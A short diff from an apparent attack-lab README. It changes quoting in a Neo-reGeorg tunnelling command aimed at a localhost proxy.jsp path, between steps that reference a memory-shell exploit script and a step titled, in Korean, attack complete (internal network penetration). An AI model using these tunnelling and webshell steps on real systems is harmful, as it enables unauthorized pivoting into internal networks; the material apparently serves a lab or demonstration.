@@ -130,7 +130,7 @@ $ python exploits/memshell.py
 ```bash
 $ pip install requests
 $ cd exploits/Neo-reGeorg
-$ python neoreg.py -k key -H 'Referer:Xljumsjp' -u "http://localhost/proxy.jsp?path=/solr/techboard/" -vv
+$ python neoreg.py -k key -H "Referer:Xljumsjp" -u "http://localhost/proxy.jsp?path=/solr/techboard/" -vv
 ```
 
 ### Step 5. 공격 완료(내부망 침투)
